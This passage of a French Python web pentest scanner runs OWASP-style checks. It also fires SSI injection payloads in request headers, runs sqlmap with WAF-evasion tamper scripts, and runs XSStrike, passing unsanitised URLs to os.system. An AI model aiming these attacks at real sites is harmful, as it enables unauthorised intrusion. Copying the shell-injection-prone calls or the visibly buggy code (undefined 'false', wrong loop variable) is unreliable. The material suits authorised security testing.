                        pass 
        if len(description) is 0:
            self._Affichage_OTG.setOTG_CONFIG(8,"OK","-")
        else:
            self._Affichage_OTG.setOTG_CONFIG(8,"KO",description)


    """    Fonction de OTG_AUTHN_006      """

    def checkHeaders(self):
        if len(self.__HTTP) != 0 or len(self.__HTTPS) != 0:
            print_domaine("Hôte : "+self.__name)

        description  = ""

        headers = 0

        if len(self.__HTTP) != 0:
            for http_req in self.__HTTP:
               print_action("Lancement de la commande : curl -s -D- "+http_req+" | grep Cache-Control\\|Pragma\\|Expires")
               
               r = requests.get(http_req)
               
               if r.status_code == 200:
                    for head in r.headers:
                         if "Cache-Control" in head:
                            if "no-cache " in r.headers[head]:
                                print_green(head+ " "+ str(r.headers[head]))
                                headers = 1
                            elif "no-store" in r.headers[head]:
                                print_green(head+ " "+ str(r.headers[head]))
                                headers = 1
                            elif "max-age=0" in r.headers[head]:
                                print_green(head+  " "+str(r.headers[head]))
                                headers = 1
                         elif "Pragma" in head:
                              print_green(head+ " "+ str(r.headers[head]))
                              headers = 1
                         elif "Expires" in head:
                              print_green(head+  " "+str(r.headers[head]))
                              headers = 1

        if len(self.__HTTPS) != 0:
            for https_req in self.__HTTPS:
               print_action("Lancement de la commande : curl -s -D- "+https_req+" | grep cache\\|Expires")
               
               r = requests.get(https_req,verify=False)
               
               if r.status_code == 200:
                    for head in r.headers:
                         if "Cache-Control" in head:
                            if "no-cache " in r.headers[head]:
                                print_green(head+ " "+str(r.headers[head]))
                                headers = 1
                            elif "no-store" in r.headers[head]:
                                print_green(head+ " "+ str(r.headers[head]))
                                headers = 1
                            elif "max-age=0" in r.headers[head]:
                                print_green(head+ " "+ str(r.headers[head]))
                                headers = 1
                         elif "Pragma" in head:
                              print_green(head+ " "+ str(r.headers[head]))
                              headers = 1
                         elif "Expires" in head:
                              print_green(head+ " "+ str(r.headers[head]))
                              headers = 1 
        if headers is 1:
            self._Affichage_OTG.setOTG_AUTHN(6,"OK","-")
        else:
            self._Affichage_OTG.setOTG_AUTHN(6,"KO","Headers Cache-Control : no-cache, no-store, max-age=0 ; Pragma et Expires non présents")


    def launchXSSStrike(self):
        if len(self.__HTTP) != 0 or len(self.__HTTPS) != 0:
            print_domaine("Hôte : "+self.__name)

        if len(self.__HTTP) != 0:
            for http_req in self.__HTTP:
                try:
                    cmd="python3.7 /opt/xss-strike/xsstrike.py --crawl --console-log-level DEBUG -u "+http_req
                    os.system(cmd)
                except:
                    print_red("Problème XSS STRIKE à l'adresse : "+http_req)

        if len(self.__HTTPS) != 0:
            for https_req in self.__HTTPS:
                try:   
                    cmd="python3.7 /opt/xss-strike/xsstrike.py --crawl --console-log-level DEBUG -u "+https_req
                    os.system(cmd)
                except:
                    print_red("Problème XSS STRIKE à l'adresse : "+https_req)


    """  Fonction de OTG_INPVAL_003  """

    def checkAllMethodsHTTP(self,METHODS):
          if len(self.__HTTP) != 0 or len(self.__HTTPS) != 0:
            print_domaine("Hôte : "+self.__name)
          description = ""

          print_action("Tentatives de changement de méthode - HTTP ")

          if len(self.__HTTP) != 0:
            for http_req in self.__HTTP:
               for METHOD in METHODS:
                    try:
                         if METHOD == "POST":
                              r = requests.request(str(METHOD),str(http_req),data={"type":"record", "name":"fidens", "content":"pentest"})
                         else:
                              r = requests.request(str(METHOD),str(http_req))

                         if r.status_code > 99 and r.status_code < 200 :
                              print_http_info("["+str(r.status_code)+"] - Methode : "+METHOD+" - "+http_req+" - Taille : "+len(r.content))
                         elif r.status_code > 199 and r.status_code < 300 :
                              print_http_succes("["+str(r.status_code)+"] - Methode : "+METHOD+" - "+http_req+" - Taille : "+len(r.content))
                              description = description + " " + http_req + " " + METHOD + " : " + str(r.status_code) + " ; "
                         elif r.status_code > 299 and r.status_code < 400 :
                              print_http_redirect("["+str(r.status_code)+"] - Methode : "+METHOD+" - "+http_req+" - Taille : "+len(r.content))
                         elif r.status_code > 399 and r.status_code < 500 :
                              print_http_erreur_client("["+str(r.status_code)+"] - Methode : "+METHOD+" - "+http_req+" - Taille : "+len(r.content))
                         elif r.status_code > 499 and r.status_code < 600 : 
                              print_http_erreur_serveur("["+str(r.status_code)+"] - Methode : "+METHOD+" - "+http_req+" - Taille : "+len(r.content))
                              description = description + " " + http_req + " " + METHOD + " : " + str(r.status_code) + " ; "                         
                         else:
                              print_red("Statut Inconnu : "+str(r.status_code)+" - Methode : "+METHOD+" - "+http_req+" - Taille : "+len(r.content))
                    except: 
                         print_red("Problème de connexion avec "+http_req)


          print_action("Tentatives de changement de méthode - HTTPS ")

          if len(self.__HTTPS) != 0:
            for https_req in self.__HTTPS:
               for METHOD in METHODS:
                    try:
                         if METHOD == "POST":
                              r = requests.request(str(METHOD),str(https_req),data={"type":"record", "name":"fidens", "content":"pentest"},verify=false)
                         else:
                              r = requests.request(str(METHOD),str(http_req),verify=false)
                              #print("Page : "+str(http_req)+", Méthode : "+str(METHOD)+", Statut : "+str(r.status_code))
                         
                         if r.status_code > 99 and r.status_code < 200 :
                              print_http_info("["+str(r.status_code)+"] - Methode : "+METHOD+" - "+https_req+" - Taille : "+len(r.content))
                         elif r.status_code > 199 and r.status_code < 300 :
                              print_http_succes("["+str(r.status_code)+"] - Methode : "+METHOD+" - "+https_req+" - Taille : "+len(r.content))
                              description = description + "" + https_req + " " + METHOD + " : " + str(r.status_code) + " ; "
                         elif r.status_code > 299 and r.status_code < 400 :
                              print_http_redirect("["+str(r.status_code)+"] - Methode : "+METHOD+" - "+https_req+" - Taille : "+len(r.content))
                         elif r.status_code > 399 and r.status_code < 500 :
                              print_http_erreur_client("["+str(r.status_code)+"] - Methode : "+METHOD+" - "+https_req+" - Taille : "+len(r.content))
                         elif r.status_code > 499 and r.status_code < 600 : 
                              print_http_erreur_serveur("["+str(r.status_code)+"] - Methode : "+METHOD+" - "+https_req+" - Taille : "+len(r.content))
                              description = description + "" + https_req + " " + METHOD + " : " + str(r.status_code) + " ; "
                         else:
                              print_red("Statut Inconnu : "+str(r.status_code)+" - Methode : "+METHOD+" - "+https_req+" - Taille : "+len(r.content))
                    except: 
                         print_red("Problème de connexion - Methode "+METHOD+" - "+https_req)

          if len(description) is 0:
            self._Affichage_OTG.setOTG_INPVAL(3,"OK","-")
          else:
            self._Affichage_OTG.setOTG_INPVAL(3,"KO",description)

    def checkUserAgentAndReferer(self):
        headers = {
          'Referer' : '<!--#exec cmd="/bin/ps ax"-->',
          'User-Agent' : '<!--#include virtual="/proc/version"-->',
         }
        
        if len(self.__HTTP) != 0 or len(self.__HTTPS) != 0:
            print_domaine("Hôte : "+self.__name)
        if len(self.__HTTP) != 0:
            for http_req in self.__HTTP:
               print_action("Requête : "+http_req+" - Headers : ")
               for head in headers:
                        print(head, headers[head])
                        r = requests.get(http_req, headers=headers)
                        if r.status_code == 200:
                                print_green("["+str(r.status_code)+"] - Requête : "+http_req+" - Taille : "+str(len(r.content)))
                                #print(r.text)
                        else:
                                print_red("["+str(r.status_code)+"] - Requête : "+http_req+" - Taille : "+str(len(r.content)))
                                #print(r.text)



        if len(self.__HTTPS) != 0:
            for https_req in self.__HTTPS:
               print_action("Requête : "+https_req+" - Headers : ")
               for head in headers:
                   print(head, headers[head])
                   r = requests.get(https_req, verify=False, headers=headers)
                   if r.status_code == 200:
                        print_green("["+str(r.status_code)+"] - Requête : "+https_req+" - Taille : "+str(len(r.content)))
                        print(r.text)
                   else:
                        print_red("["+str(r.status_code)+"] - Requête : "+https_req+" - Taille : "+str(len(r.content)))
                        print(r.text)

    """  Fonction de OTG_ERR_001  """

    def checkErrors(self,MALFORMED_CARACS):
          if len(self.__HTTP) != 0 or len(self.__HTTPS) != 0:
            print_domaine("Hôte : "+self.__name)

          description = ""
          
          if len(self.__HTTP) != 0:
            print_action("Ajout de caractère malformés - HTTP ")
            for http_req in self.__HTTP:
               for carac in MALFORMED_CARACS:
                    try:
                         description = requeteHTTP(http_req,carac,1)
                    except: 
                         print_red("Problème de connexion avec "+http_req)

          
          if len(self.__HTTPS) != 0:
            print_action("Ajout de caractère malformés - HTTPS ")
            for https_req in self.__HTTPS:
               for carac in MALFORMED_CARACS:
                    try:
                         description = requeteHTTPS(https_req,carac,1)
                    except: 
                         print_red("Problème de connexion avec "+https_req)

          if len(description) is 0:
            self._Affichage_OTG.setOTG_ERR(1,"OK","-")
          else:
            self._Affichage_OTG.setOTG_ERR(1,"KO",description)



    def sqlmap(self):
        if len(self.__HTTP) != 0 or len(self.__HTTPS) != 0:
            print_domaine("Hôte : "+self.__name)
            print_action("CRAWL")

        if len(self.__HTTP) != 0:            
            print_info("CRAWL - HTTP")
            for http_req in self.__HTTP:
                try:
                    print_action("Adresse étudiée :"+http_req)
                    cmd="sqlmap -u '"+http_req+"' --crawl=2"
                    os.system(cmd)
                except:
                    print_red("Problème SQLMAP CRAWL : "+http_req)
        
        
        if len(self.__HTTPS) != 0:
            print_action("CRAWL - HTTPS")
            for https_req in self.__HTTPS:
                try:
                    print_action("Adresse étudiée :"+https_req)
                    cmd="sqlmap -u '"+https_req+"' --crawl=2"
                    os.system(cmd)
                except:
                    print_red("Problème SQLMAP CRAWL : "+https_req)

        if len(self.__HTTP) != 0 or len(self.__HTTPS) != 0:
            print_action("INJECTION SQL")
        
        if len(self.__HTTP) != 0:
            print_info("INJECTION SQL - HTTP")
            for http_req in self.__HTTP:
                try:
                    print_action("Adresse étudiée :"+http_req)
                    cmd="sqlmap -u "+http_req+" --level=3 --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,randomcomments,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords"
                    os.system(cmd)
                except:
                    print_red("Problème SQLMAP INJECTION SQL : "+http_req)
        
        
        if len(self.__HTTPS) != 0:
            print_action("INJECTION SQL - HTTPS")
            for https_req in self.__HTTPS:
                try:
                    print_action("Adresse étudiée :"+https_req)
                    cmd="sqlmap -u "+https_req+" --level=3 --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,randomcomments,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords"
                    os.system(cmd)
                except:
                    print_red("Problème SQLMAP INJECTION SQL : "+https_req)

    """ FONCTION OTG_SESS_002 """

    def checkCookieAttributes(self):
        if len(self.__HTTP) != 0 or len(self.__HTTPS) != 0:
            print_domaine("Hôte : "+self.__name)
        description = ""
        cookie = 0
        if len(self.__HTTP) != 0:
            for http_req in self.__HTTP:
                try:
                    req = requests.get(http_req) 
                    if len(req.cookies) == 0:
                        print_red("Pas de cookie pour "+http_req)
                        description = description + "Pas de verification des cookies pour "+http_req
                    else:
                        print_action("Cookies de "+http_req) 
                        for cookie in req.cookies:
                            description = description + http_req + " : " 
                            print('Name:', cookie.name)
                            print('Value:', cookie.value)

                            if not cookie.secure:    
                                cookie.secure = 'False'
                                description = description + "Pas Secure : False  - "
                                print_red("Secure : False") 
                            else:
                                print_green("Secure : "+cookie.secure)
                                cookie = 1

                            if 'httponly' in cookie._rest.keys():
                                cookie.httponly = 'True'  
                                print_green("HTTPOnly : "+cookie.httponly)
                            else:    
                                cookie.httponly = 'False'  
                                print_red("HTTPOnly : "+cookie.httponly)
                                description = description + "HTTPOnly: False  - "

                            if cookie.domain_initial_dot:    
                                cookie.domain_initial_dot = 'True'  
                                print_green("Domaine : "+cookie.domain_initial_dot)
                            else:
                                cookie.domain_initial_dot = 'False'
                                print_red("Domaine : "+cookie.domain_initial_dot)
                                description = description + "Domaine : "+cookie.domain_initial_dot+" - "
                except: 
                    print_red("Probleme avec "+http_req)              


        if len(self.__HTTPS) != 0:
            for https_req in self.__HTTPS:
                try:
                    req = requests.get(https_req, verify=False)
                    if len(req.cookies) == 0:
                        print_red("Pas de cookie pour "+https_req)
                        description = description + "Pas de verification des cookies pour "+https_req 
                    else:
                        print_action("Cookies de "+https_req)
                        for cookie in req.cookies:  
                            description = description + https_req + " : "
                            print('Name:', cookie.name) 
                            print('Value:', cookie.value)

                            if not cookie.secure:    
                                cookie.secure = 'False'
                                print_red("Secure : False") 
                                description = description + "Pas Secure : False  - "
                            else:
                                print_green("Secure : "+cookie.secure)

                            if 'httponly' in cookie._rest.keys():
                                cookie.httponly = 'True'  
                                print_green("HTTPOnly : "+cookie.httponly)
                            else:    
                                cookie.httponly = 'False'  
                                print_red("HTTPOnly : "+cookie.httponly)
                                description = description + "HTTPOnly: False  - "

                            if cookie.domain_initial_dot:    
                                cookie.domain_initial_dot = 'True'  
                                print_green("Domaine : "+cookie.domain_initial_dot)
                            else:
                                cookie.domain_initial_dot = 'False'
                                print_red("Domaine : "+cookie.domain_initial_dot)
                                description = description + "Domaine : "+cookie.domain_initial_dot+" - "
                except: 
                    print_red("Probleme avec "+https_req)

        if len(description) is 0:
            self._Affichage_OTG.setOTG_SESS(2,"OK","-")
        else:
            self._Affichage_OTG.setOTG_SESS(2,"KO",description)

    def grabJavaScript(self,JAVASCRIPT):
            if len(self.__HTTP) != 0 or len(self.__HTTPS) != 0:
                print_domaine("Hôte : "+self.__name)

            if len(self.__HTTP) != 0:
                for http_req in self.__HTTP:
                    try:
                        scripts = []
                        url = requests.get(http_req) 
                        soup = BeautifulSoup(url.text,features="lxml")
                    
                        for line in soup.find_all('script'):  
                            newline = line.get('src')
                            if newline == None:
                                pass
                            else:
                                scripts.append(newline)

                        if len(scripts)==0:
                            pass

                        print_action("Adresse "+http_req+" - Javascript Found:")

                        for script in scripts:
                            print_info("Src frontend : "+script)
                            url = requests.get(http_req+"/"+script)

                            for lib in JAVASCRIPT:
                                try:
                                    if str(lib).lower() in str(script).lower():
                                        versions = re.findall(r'\d[0-9a-zA-Z._:-]+',url.text)  #  re.findall(r'ersion="[0-9].[0-9].[0-9]"', 'abc1,44;5-6.5523xyz ver5.6.7version=\"4.5.5\"')
                                        print_green(lib+" - Version : "+versions[0])
                                except:
                                    pass                        
                    except:
                        print_red("Probleme avec "+http_req)


            if len(self.__HTTPS) != 0:
                for https_req in self.__HTTPS:
                    try:
                        scripts = []
                        url = requests.get(https_req,verify=False) 
                        soup = BeautifulSoup(url.text,features="lxml")

                        for line in soup.find_all('script'):  
                            newline = line.get('src')  
                            if newline == None:
                                pass
                            else:
                                scripts.append(newline)

                        if len(scripts)==0:
                            pass

                        print_action("Adresse "+https_req+" - Javascript Found:")

                        for script in scripts:
                            print_info("Src frontend : "+script)
                            url = requests.get(https_req+"/"+script,verify=False)  
                            for lib in JAVASCRIPT:
                                try:
                                    if str(lib).lower() in str(script).lower():                               
                                        versions = re.findall(r'\d[0-9a-zA-Z._:-]+',url.text)    
                                        print_green(lib+" - Version : "+versions[0])
                                except:
                                    pass                        
                    except:
                        print_red("Probleme avec "+https_req)

## RECOMMANDATIONS

    def checkEnTetesHTTP(self):
        if len(self.__HTTP) != 0 or len(self.__HTTPS) != 0:
            print_domaine("Hôte : "+self.__name)

        if len(self.__HTTP) != 0:
            for http_req in self.__HTTP: 
                print_action("Requêtes HTTP : "+http_req)           
                req = requests.get(http_req)

                try:    
                    xssprotect = req.headers['X-XSS-Protection']    
                    if  xssprotect != '1; mode=block':      
                        print_red("X-XSS-Protection mal configuré, XSS possible - "+xssprotect)
                    else:
                        print_green("X-XSS-Protection bien configuré - "+xssprotect)
                except:    
                        print_red("X-XSS-Protection non configuré, XSS possible ") 

                try:    
                    contenttype = req.headers['X-Content-Type-Options']    
                    if contenttype != 'nosniff':   
                        print_red("X-Content-Type-Options mal configuré - "+contenttype) 
                    else:
                       print_green("X-Content-Type-Options bien configuré - "+contenttype) 
                except:    
                        print_red("X-Content-Type-Options non configuré")

                try:    
                    hsts = req.headers['Strict-Transport-Security']  
                    print_green("Strict-Transport-Security bien configuré")
                except:   
                    print_red("Strict-Transport-Security non présent - Attaque de l'homme du milieu possible") 
                
                try:    
                    csp = req.headers['Content-Security-Policy'] 
                    print_green("Content-Security-Policy présent : "+csp)
                except:    
                    print_red("Content-Security-Policy non présent") 

                try:    
                    rp = req.headers['Referrer-Policy'] 
                    print_green("Referrer-Policy présent : "+rp)
                except:    
                    print_red("Referrer-Policy non présent") 

                try:    
                    fo = req.headers['X-Frame-Options'] 
                    print_green("X-Frame-Options présent : "+fo)
                except:    
                    print_red("X-Frame-Options mal configuré") 

                try:    
                    cdp = req.headers['X-Permitted-Cross-Domain-Policies'] 
                    print_green("X-Permitted-Cross-Domain-Policies présent : "+cdp)
                except:    
                    print_red("X-Permitted-Cross-Domain-Policies mal configuré")


        if len(self.__HTTPS) != 0:
            for https_req in self.__HTTPS:
                print_action("Requêtes HTTPS : "+https_req)        

                req = requests.get(https_req,verify=False)

                try:    
                    xssprotect = req.headers['X-XSS-Protection']    
                    if  xssprotect != '1; mode=block':      
                        print_red("X-XSS-Protection mal configuré, XSS possible")
                        print(xssprotect)
                    else:
                        print_green("X-XSS-Protection bien configuré - ")
                        print(xssprotect)

                except:    
                        print_red("X-XSS-Protection non configuré, XSS possible")
 

                try:    
                    contenttype = req.headers['X-Content-Type-Options']    
                    if contenttype != 'nosniff':   
                        print_red("X-Content-Type-Options mal configuré - ")
                        print(contenttype) 
                    else:
                       print_green("X-Content-Type-Options bien configuré - ") 
                       print(contenttype)
                except:    
                        print_red("X-Content-Type-Options non configuré")

                try:    
                    hsts = req.headers['Strict-Transport-Security']  
                    print_green("Strict-Transport-Security bien configuré")
                    print(hsts)

                except:   
                    print_red("Strict-Transport-Security non présent - Attaque de l'homme du milieu possible") 

                try:    
                    csp = req.headers['Content-Security-Policy'] 
                    print_green("Content-Security-Policy présent : ")
                    print(csp)
                except:    
                    print_red("Content-Security-Policy non présent") 

                try:    
                    rp = req.headers['Referrer-Policy'] 
                    print_green("Referrer-Policy présent : ")
                    print(rp)
                except:    
                    print_red("Referrer-Policy non présent") 

                try:    
                    fo = req.headers['X-Frame-Options'] 
                    print_green("X-Frame-Options présent : ")
                    print(fo)
                except:    
                    print_red("X-Frame-Options mal configuré") 

                try:    
                    cdp = req.headers['X-Permitted-Cross-Domain-Policies'] 
                    print_green("X-Permitted-Cross-Domain-Policies présent : ")
                    print(cdp)
                except:    
                    print_red("X-Permitted-Cross-Domain-Policies mal configuré") 

def affichageOTG():
     print("\n")
     print_banniere("*******************************************")
     print_banniere("*                                         *")
     print_banniere("*            OWASP V2.0                   *")
     print_banniere("*                                         *")
     print_banniere("*              Fidens                     *")
     print_banniere("*******************************************")
     print_banniere("*           [0] all OTG                   *")
     print_banniere("*           [1] OTG INFO         ✔        *")   
     print_banniere("*           [2] OTG CONFIG       ✔        *")               
     print_banniere("*           [3] OTG IDENT        ✔        *")               
     print_banniere("*           [4] OTG AUTHN        ✔        *")              
     print_banniere("*           [5] OTG AUTHZ        ✔        *")               
     print_banniere("*           [6] OTG SESS         ✔        *")               
     print_banniere("*           [7] OTG INPVAL       ✔        *")               
     print_banniere("*           [8] OTG ERR          ✔        *")               
     print_banniere("*           [9] OTG CRYPST       ✔        *")                  
     print_banniere("*           [10] OTG BUSLOGIC    ✔        *")               
     print_banniere("*           [11] OTG CLIENT      ✗        *")
     print_banniere("*******************************************")
     print_banniere("*           [dD] Sous Domaines            *")     
     print_banniere("*******************************************")
     print_banniere("*           [bB] Bonnes Pratiques         *")
     print_banniere("*           [rR] Recommandations Add.     *")
     print_banniere("*******************************************")
     print_banniere("*           [sS] Show Open Services       *")
     print_banniere("*           [pP] Add port                 *")
     print_banniere("*           [iI] Add Identifiants         *")
     print_banniere("*******************************************")
     print_banniere("*           [eE] Exit                     *")
     print_banniere("*******************************************")
     print("\n")

def affichageRECO():
     print("\n")
     print_banniere("*******************************************")
     print_banniere("*                                         *")
     print_banniere("*                RECO                     *")
     print_banniere("*                                         *")
     print_banniere("*******************************************")
     print_banniere("*      [0] En têtes HTTP présents         *")
     print_banniere("*      [1] Fichiers par défaut            *")
     print_banniere("*      Ex: Install Drupal, Typo3...       *")
     print_banniere("*******************************************")
     print_banniere("*     [rR] Retour au menu principal       *")
     print_banniere("*******************************************")

     print("\n")


def demandeOTG():
     var=input("[+] Entrer un numéro pour continuer : ")
     return var

def demandeDOMAINE():
     var=input("[+] Entrer un nom de domaine pour déterminer ses sous domaines: ")
     return var

def demandePort():
     var=input("[+] Entrer un port : ")
     return var

def main():
    try:
        #VAR

        #Si pas de port ajouté, 80 et 443 par défaut
        DEFAULT_PORTS = [80,443]

        #Common Ports https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Infrastructure/common-http-ports.txt
        COMMON_PORTS = [66,80,81,443,445,457,1080,1100,1241,1352,1433,1434,1521,1944,2301,3128,3306,4000,4001,4002,4100,5000,5432,5800,5801,5802,6346,6347,7001,7002,8080,8888,30821]
         

        ## Gestion des arguments
        parser = argparse.ArgumentParser()
        parser.add_argument("-p","--ports",  help="Add port to scan (ex use : \"-p 8080,8000\"). For 30 common ports, use \"-p cp\". Default are 80 and 443.", type=str)
        parser.add_argument("-d","--domaines",  help="Add domain to scan (use : -d toto.fr,tata.com)", type=str)
        args = parser.parse_args()

        ## Tous les domaines étudiés
        MainListOfDomains= []
        ## Tous les ports étudiés
        MainListOfPorts = []

        ##Ajout des domaines
        if args.domaines == None:
            print_red("Usage: ./owasp -d toto,tata")
            exit()
        else:
            try:
                for item in args.domaines.split(','):
                    MainListOfDomains.append(Domaine(str(item)))
            except:
                print_red("Usage: ./owasp -d toto,tata")

        #Ajout des ports
        # Ajout des ports utilisateurs : 80 + 443 + autres
        if args.ports == None:
                print_info("Default port 80 and 443")
                MainListOfPorts=DEFAULT_PORTS
        elif args.ports == "cp":
                print_info("Common Ports : 66,80,81,443,445,457,1080,1100,1241,1352,1433,1434,1521,1944,2301,3128,3306,4000,4001,4002,4100,5000,5432,5800,5801,5802,6346,6347,7001,7002,8080,8888,30821")
                MainListOfPorts = COMMON_PORTS
        else: 
              #choix utilisateur -p <port>
            for item in args.ports.split(','):
                MainListOfPorts.append(int(item))

              #Suppression des doublons
            MainListOfPorts = list(dict.fromkeys(MainListOfPorts))

              #Dans l'ordre
            MainListOfPorts.sort()

        #Search open / filtered and closed port on all domaines
        for D in MainListOfDomains:
            D.searchPorts(MainListOfPorts)
            #D.display()



         #DOMAINE_NAME = "192.168.2.91"
        affichageOTG()
        while True:
            try:
                number=demandeOTG()
            except :
                pass


            otg = OTG(MainListOfDomains)

            if number == "0":
                otg.allOTG()

            elif number == "1":
                otg.OTG_INFO()                
            elif number == "2":
                otg.OTG_CONFIG() 
            elif number == "3":
                otg.OTG_IDENT() 
            elif number == "4":
                otg.OTG_AUTHN()
            elif number == "5":
                otg.OTG_AUTHZ()
            elif number == "6":
                otg.OTG_SESS()
            elif number == "7":
                otg.OTG_INPVAL()
            elif number == "8":
                otg.OTG_ERR()
            elif number == "9":
                otg.OTG_CRYPST()
            elif number == "10":
                otg.OTG_BUSLOGIC()
            elif number == "11":
                otg.OTG_CLIENT()

            #Services info
            elif number == "s" or number == "S":
                for D in MainListOfDomains:
                    D.getServicesInfo()

            #Recommandations
            elif number == "r" or number == "R":
                
                otg.RECOMMANDATIONS()

            #Domaines et sous domaines
            elif number == "d" or number == "D":
                
                otg.DOMAINES()

            ##Add Hypothetical port : check if present in each domains and add it if necessary
            elif number == "p" or number == "P":
                succes=0

                while succes == 0:
                    try:
                        port = demandePort()
                        if int(port) < 0 or int(port) > 65535:
                            print_red("Invalide numéro de port. Il doit être compris entre 0 et 65 535.")
                        else:
                            succes = 1 
                    except:
                        print_red("Invalide numéro de port. Il doit être compris entre 0 et 65 535.")

                for D in MainListOfDomains:
                    D.addHypotheticalPort(port)

            elif number == "i" or number == "I":
                print_info("Ajout d'identifiant / mot de passe ")
                print_info("Ex: Tentative de fixation de session.")

                for D in MainListOfDomains:
                    D.addIds()
            elif number == "e" or number == "E":
                sys.exit()
            else:
                print("Je n'ai pas compris votre choix")               

            affichageOTG()

    except KeyboardInterrupt:
          pass

main()
